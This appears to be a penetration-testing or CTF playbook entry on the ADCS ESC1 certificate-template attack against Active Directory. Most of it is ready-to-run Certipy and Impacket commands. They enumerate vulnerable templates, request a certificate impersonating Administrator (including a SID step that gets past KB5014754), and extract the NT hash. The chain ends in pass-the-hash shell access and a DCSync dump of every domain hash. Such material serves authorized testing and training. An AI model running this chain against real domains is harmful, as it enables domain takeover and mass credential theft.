---
id: adcs-esc1
title: ADCS ESC1 — Enrollee Supplies Subject
stage: privesc
tags: [windows, ad]
tools:
  - "certipy find -u user@$DOMAIN -p password -dc-ip $DC_IP -vulnerable -stdout"
  - "certipy req -u user@$DOMAIN -p password -dc-ip $DC_IP -ca CA-NAME -template VulnerableTemplate -upn Administrator@$DOMAIN"
  - certipy auth -pfx administrator.pfx -dc-ip $DC_IP
leads_to:
  - domain-admin
  - dcsync
---

## Enumerate (run any time ADCS is present)

```bash
# Flag vulnerable templates immediately
certipy find -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -vulnerable -stdout

# With hash
certipy find -u 'account$@$DOMAIN' -hashes ':$NTLM_HASH' -dc-ip $DC_IP -vulnerable -stdout

# Dump all templates if nothing flagged
certipy find -u user@$DOMAIN -p 'password' -dc-ip $DC_IP -stdout
```

## ESC1 Conditions (all three must be true)

1. Template has `Client Authentication` EKU
2. `Enrollee Supplies Subject: True` (or `User Specified SAN: Enabled`)
3. Low-privilege accounts in `Enrollment Rights`

## Exploit

```bash
# Request cert as Administrator (put UPN in SAN)
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -ca 'CA-NAME' -template 'VulnerableTemplate' -upn Administrator@$DOMAIN

# Windows Server 2022 with KB5014754 (StrongCertificateBindingEnforcement)?
# Must embed the target account's Object SID
# Get SID first:
impacket-lookupsid $DOMAIN/user:pass@$DC_IP | grep " 500 "
certipy req -u user@$DOMAIN -p 'password' -dc-ip $DC_IP \
  -ca 'CA-NAME' -template 'VulnerableTemplate' -upn Administrator@$DOMAIN \
  -sid S-1-5-21-...-500

# Authenticate with the cert → get NT hash
certipy auth -pfx administrator.pfx -dc-ip $DC_IP

# Use NT hash
evil-winrm -i $DC_IP -u Administrator -H <NT_HASH>
impacket-secretsdump $DOMAIN/Administrator@$DC_IP -hashes :$NT_HASH
```

## Notes

The CA name appears in `certipy find` output or in LDAP as the PKI enrollment object. ESC1 is the most common ADCS finding in CTFs — it goes straight to DA with no shell needed. After auth, you get an NT hash: PTH to get a shell and/or DCSync for all hashes.
